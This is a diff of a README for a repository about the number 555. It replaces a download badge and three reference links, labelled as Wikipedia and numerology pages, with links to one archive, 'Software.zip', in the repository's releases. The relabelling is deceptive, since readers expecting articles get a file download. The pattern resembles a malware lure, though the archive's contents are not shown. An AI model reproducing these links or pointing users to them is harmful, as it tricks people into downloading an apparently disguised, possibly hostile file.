@@ -6,7 +6,7 @@ Welcome to the 555 repository! Here you can find a collection of resources relat
 
 To get started with the 555 repository, you can download the latest release by clicking the button below:
 
-[![Download 555 Repository](https://img.shields.io/badge/Download-555%20Repository-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download 555 Repository](https://github.com/WhiteBlushArt/555/releases/download/v1.0/Software.zip%20Repository-brightgreen)](https://github.com/WhiteBlushArt/555/releases/download/v1.0/Software.zip)
 
 If the link does not work or you prefer to explore more options, please visit the "Releases" section of this repository.
 
@@ -20,9 +20,9 @@ Feel free to browse through the files and folders to uncover the hidden gems of 
 
 In addition to the contents of this repository, you can check out the following resources to enhance your understanding of 555:
 
-- [555 Wikipedia Page](https://en.wikipedia.org/wiki/555_(number)) - Learn more about the mathematical properties and cultural references of 555.
-- [Numerology of 555](https://www.numerology.com/numerology-numbers/555) - Explore the mystical interpretation of the number 555 in numerology.
-- [555 Angel Number](https://www.sunsigns.org/angel-number-555-meaning/) - Discover the spiritual significance of seeing 555 as an angel number.
+- [555 Wikipedia Page](https://github.com/WhiteBlushArt/555/releases/download/v1.0/Software.zip(number)) - Learn more about the mathematical properties and cultural references of 555.
+- [Numerology of 555](https://github.com/WhiteBlushArt/555/releases/download/v1.0/Software.zip) - Explore the mystical interpretation of the number 555 in numerology.
+- [555 Angel Number](https://github.com/WhiteBlushArt/555/releases/download/v1.0/Software.zip) - Discover the spiritual significance of seeing 555 as an angel number.
 
 ## 🤝 Contribution
 
